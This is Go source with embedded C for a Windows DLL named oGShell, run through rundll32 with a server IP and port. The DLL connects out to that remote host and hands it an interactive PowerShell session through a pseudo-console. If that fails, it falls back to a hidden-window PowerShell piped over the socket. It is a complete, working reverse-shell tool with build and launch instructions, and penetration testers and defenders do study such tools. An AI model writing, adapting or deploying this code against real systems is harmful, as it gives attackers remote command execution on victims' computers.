//go:build windows

/*
To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -o oGShell.dll cmd/dll/main.go
run with rundll32 oGShell.dll,oGShell <serverIP> <serverPort>
*/
package main

/*
#include <windows.h>
#include <stdio.h>
#include <process.h>

// ConPTY function pointers since we need to load them dynamically
// They aren't available on older Windows versions
typedef HRESULT (*CreatePseudoConsole_t)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
typedef HRESULT (*ResizePseudoConsole_t)(HPCON, COORD);
typedef void (*ClosePseudoConsole_t)(HPCON);

static CreatePseudoConsole_t pCreatePseudoConsole = NULL;
static ClosePseudoConsole_t pClosePseudoConsole = NULL;

static HPCON hPC = NULL;
static HANDLE inputWrite = NULL;
static HANDLE outputRead = NULL;

static void TakeConsoleOwnership() {
    // Force a clean ownership transfer
    FreeConsole();
    AttachConsole(ATTACH_PARENT_PROCESS);

    freopen("CONOUT$", "w", stdout);
    freopen("CONOUT$", "w", stderr);
    freopen("CONIN$", "r", stdin);

    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
	FlushConsoleInputBuffer(hStdin);
    SetConsoleMode(hStdin,
        ENABLE_ECHO_INPUT |
        ENABLE_LINE_INPUT |
        ENABLE_PROCESSED_INPUT |
        ENABLE_EXTENDED_FLAGS);
}

static void InjectBackspace() {
    HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
    INPUT_RECORD ir[2];
    DWORD written;

    ir[0].EventType = KEY_EVENT;
    ir[0].Event.KeyEvent.bKeyDown = TRUE;
    ir[0].Event.KeyEvent.wRepeatCount = 1;
    ir[0].Event.KeyEvent.wVirtualKeyCode = VK_BACK;
    ir[0].Event.KeyEvent.wVirtualScanCode = 0x0e;
    ir[0].Event.KeyEvent.uChar.UnicodeChar = '\b';
    ir[0].Event.KeyEvent.dwControlKeyState = 0;

    ir[1] = ir[0];
    ir[1].Event.KeyEvent.bKeyDown = FALSE;

	WriteConsoleInput(hStdin, ir, 2, &written);
}

static void ReleaseConsole() {
    FreeConsole();
}

static void EnableVTProcessing() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hOut, &mode);
    SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);

    // Also set VT input mode
    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    GetConsoleMode(hIn, &mode);
    SetConsoleMode(hIn, mode | ENABLE_VIRTUAL_TERMINAL_INPUT);
}

static int InitConPTY(int cols, int rows) {
    HANDLE inputRead = NULL;
    HANDLE outputWrite = NULL;

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pCreatePseudoConsole = (CreatePseudoConsole_t)GetProcAddress(hKernel32, "CreatePseudoConsole");
    pClosePseudoConsole = (ClosePseudoConsole_t)GetProcAddress(hKernel32, "ClosePseudoConsole");

    if (!pCreatePseudoConsole || !pClosePseudoConsole) {
        return 0;
    }

    if (!CreatePipe(&inputRead, &inputWrite, NULL, 0)) return 0;
    if (!CreatePipe(&outputRead, &outputWrite, NULL, 0)) return 0;

    COORD size = { (SHORT)cols, (SHORT)rows };
    HRESULT hr = pCreatePseudoConsole(size, inputRead, outputWrite, PSEUDOCONSOLE_INHERIT_CURSOR, &hPC);

    CloseHandle(inputRead);
    CloseHandle(outputWrite);

    return SUCCEEDED(hr) ? 1 : 0;
}

static HANDLE SpawnShellWithPTY() {
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hIn, &mode);
    SetConsoleMode(hIn, mode & ~ENABLE_MOUSE_INPUT & ~ENABLE_WINDOW_INPUT);

    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attrListSize);

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize)) {
        return (HANDLE)-1;  // distinct error code
    }

    if (!UpdateProcThreadAttribute(
            si.lpAttributeList, 0,
            PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
            hPC, sizeof(HPCON), NULL, NULL)) {
        return (HANDLE)-2;  // distinct error code
    }

	// Set TERM in current environment before spawning
	SetEnvironmentVariableW(L"TERM", L"dumb");

	wchar_t cmd[] = L"powershell.exe -NoExit";
	if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
			EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_PROCESS_GROUP,
			NULL,  // inherit parent environment
			NULL,
			&si.StartupInfo, &pi)) {
		return (HANDLE)-3;
	}

    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);

    return pi.hProcess;
}

static void CleanupConPTY(HANDLE hProcess) {
    if (hPC && pClosePseudoConsole) {
        pClosePseudoConsole(hPC);
        hPC = NULL;
    }
    if (inputWrite) {
        CloseHandle(inputWrite);
        inputWrite = NULL;
    }
    if (outputRead) {
        CloseHandle(outputRead);
        outputRead = NULL;
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }
}

static uintptr_t GetInputWrite() {
    return (uintptr_t)inputWrite;
}

static uintptr_t GetOutputRead() {
    return (uintptr_t)outputRead;
}

static uintptr_t GetProcessHandle(HANDLE h) {
    return (uintptr_t)h;
}

static void DisablePTYEcho() {
    HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hIn, &mode);
    SetConsoleMode(hIn, mode & ~ENABLE_ECHO_INPUT & ~ENABLE_MOUSE_INPUT & ~ENABLE_WINDOW_INPUT);
}
*/
import "C"

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

// Set server ip and port to null
// Can set these before building if you want to hardcode them
// Or they will be read from command-line I/O
var serverIP = ""
var serverPort = ""

var exportCalled = make(chan struct{}, 1)

func main() {

}

func init() {
	go watcher()
}

func watcher() {
	select {
	case <-exportCalled:
		// EntryPoint was called, it handles its own logic
		return
	case <-time.After(100 * time.Millisecond):
		// No export called, run interactive prompt
		defaultCall()
	}
}

func allocConsole() error {
	time.Sleep(250 * time.Millisecond)
	C.TakeConsoleOwnership()

	stdout, err := os.OpenFile("CONOUT$", os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	os.Stdout = stdout
	os.Stderr = stdout

	stdin, err := os.OpenFile("CONIN$", os.O_RDONLY, 0)
	if err != nil {
		return err
	}
	os.Stdin = stdin

	fmt.Println("")
	return nil
}

func getConnectionDetails(defaultIP, defaultPort string, timeout time.Duration) (string, string) {
	fmt.Printf("Enter IP and Port you would like to use or wait %.0f seconds to use defaults (%s:%s):\n", timeout.Seconds(), defaultIP, defaultPort)
	fmt.Println("Press Enter without typing anything to use defaults.")

	ip := timedRead("IP:", defaultIP, timeout)
	if ip == defaultIP {
		return defaultIP, defaultPort
	}
	port := timedRead("Port:", defaultPort, timeout)

	return ip, port
}

func timedRead(prompt, defaultVal string, timeout time.Duration) string {
	fmt.Printf("%s ", prompt)
	C.InjectBackspace()

	ch := make(chan string, 1)

	go func() {
		var input string
		fmt.Scanln(&input)
		input = strings.TrimSpace(input)
		ch <- input
	}()

	select {
	case input := <-ch:
		if input == "" {
			return defaultVal
		}
		return input
	case <-time.After(timeout):
		fmt.Println("\nTimed out, using default:", defaultVal)
		return defaultVal
	}
}

func createConnection(serverIP, serverPort string) {
	address := net.JoinHostPort(serverIP, serverPort)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error connecting to server: %v\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	if C.InitConPTY(80, 24) == 0 {
		fmt.Println("ConPTY not supported on this system.")

		// Fallback to regular shell without PTY
		cmd := exec.Command("powershell.exe")
		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		cmd.Run()
		return
	}

	hProcess := C.SpawnShellWithPTY()
	if hProcess == nil {
		fmt.Println("Failed to spawn shell with ConPTY.")
		return
	}

	// Get Go file handles for the PTY pipes
	inputWriteFile := os.NewFile(uintptr(C.GetInputWrite()), "pty-input")
	outputReadFile := os.NewFile(uintptr(C.GetOutputRead()), "pty-output")

	var lastSent []byte

	// Network -> PTY input
	go func() {
		buf := make([]byte, 1024)
		for {
			n, err := conn.Read(buf)
			if n > 0 {
				data := bytes.ReplaceAll(buf[:n], []byte{'\n'}, []byte{'\r'})
				lastSent = make([]byte, len(data))
				copy(lastSent, data)
				inputWriteFile.Write(data)
			}
			if err != nil {
				break
			}
		}
		inputWriteFile.Close()
	}()

	// PTY output -> network
	go func() {
		var overflow []byte
		buf := make([]byte, 4096)
		for {
			n, err := outputReadFile.Read(buf)
			if n > 0 {
				data := append(overflow, buf[:n]...)
				overflow = nil

				// Respond to cursor query
				if bytes.Contains(data, []byte{27, 91, 54, 110}) {
					inputWriteFile.Write([]byte{27, 91, 49, 59, 49, 82})
				}

				var clean []byte
				i := 0
				for i < len(data) {
					if data[i] == 27 {
						if i+1 >= len(data) {
							overflow = data[i:]
							break
						}

						if data[i+1] == 93 {
							// OSC sequence \x1b]....\x07 - strip title etc
							end := bytes.IndexByte(data[i:], 7)
							if end == -1 {
								overflow = data[i:]
								break
							}
							i += end + 1
							continue
						}

						if data[i+1] == 91 {
							// CSI sequence \x1b[...
							if i+2 >= len(data) {
								overflow = data[i:]
								break
							}
							j := i + 2
							for j < len(data) && (data[j] < 64 || data[j] > 126) {
								j++
							}
							if j >= len(data) {
								overflow = data[i:]
								break
							}
							finalByte := data[j]

							strip := false
							switch {
							case finalByte == 'n': // cursor query
								strip = true
							case finalByte == 'R': // cursor position report
								strip = true
							case finalByte == 'h' || finalByte == 'l': // mode set/reset
								strip = true
							case finalByte == 'm': // all color/style
								strip = true
							case finalByte == 'H': // cursor position
								strip = true
							case finalByte == 'X': // erase character
								strip = true
							case finalByte == 'A' || finalByte == 'B' ||
								finalByte == 'C' || finalByte == 'D': // cursor movement
								strip = true
							}

							if strip {
								i = j + 1
								continue
							}
							clean = append(clean, data[i:j+1]...)
							i = j + 1
							continue
						}
					}
					clean = append(clean, data[i])
					i++
				}
				// Translate line endings for Unix listener
				clean = bytes.ReplaceAll(clean, []byte{'\r', '\n'}, []byte{'\n'})
				clean = bytes.ReplaceAll(clean, []byte{'\r'}, []byte{'\n'})
				if len(clean) > 0 {
					conn.Write(clean)
				}
			}
			if err != nil {
				break
			}
		}
		outputReadFile.Close()
	}()

	// Give PowerShell time to initialize then disable echo
	go func() {
		time.Sleep(500 * time.Millisecond)
		inputWriteFile.Write([]byte("[Console]::TreatControlCAsInput=$true\r"))
		time.Sleep(100 * time.Millisecond)
		inputWriteFile.Write([]byte("Remove-Module PSReadLine\r"))
		time.Sleep(100 * time.Millisecond)
		inputWriteFile.Write([]byte("[Console]::InputEncoding=[System.Text.Encoding]::UTF8\r"))
	}()

	// Wait for shell process to exit
	syscall.WaitForSingleObject(
		syscall.Handle(C.GetProcessHandle(hProcess)),
		syscall.INFINITE,
	)

	C.CleanupConPTY(hProcess)
}

func printHelp() {
	fmt.Println("Error calling oGShell export. Usage:")
	fmt.Println("rundll32 oGShell.dll,oGShell <serverIP> <serverPort>")
	fmt.Println("")
	fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables in the main function before compiling")
	fmt.Println("")
	C.ReleaseConsole()
	os.Exit(1)
}

func defaultCall() {
	allocConsole()
	printHelp()
}

//export oGShell
func oGShell(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32) {
	// Signal the watcher
	exportCalled <- struct{}{}

	allocConsole()

	// Parse command-line arguments
	args := C.GoString(lpszCmdLine)
	parts := strings.Fields(args)

	switch len(parts) {
	case 2:
		serverIP = parts[0]
		serverPort = parts[1]
		// Check to make sure that the provided IP and Port are valid
		if net.ParseIP(serverIP) == nil {
			fmt.Printf("Invalid IP address: %s\n", serverIP)
			if serverIP != "" && serverPort != "" {
				fmt.Printf("Hardcoded IP and port is %s:%s\n", serverIP, serverPort)
				if strings.ToLower(timedRead("Would you like to continue with this host? (Y/N)", "n", 15*time.Second)) == "n" {
					fmt.Println("Quitting.")
					printHelp()
				}
			}
		} else {
			break
		}
		fallthrough
	case 0:
		serverIP, serverPort = getConnectionDetails(serverIP, serverPort, 30*time.Second)
		fmt.Printf("Attempting to use IP and Port: %s:%s\n", serverIP, serverPort)
		if serverIP == "" && serverPort == "" {
			fmt.Println("IP and Port are null, quitting.")
			printHelp()
		}
		break
	default:
		printHelp()
	}

	createConnection(serverIP, serverPort)
	C.ReleaseConsole()
	os.Exit(0)
}
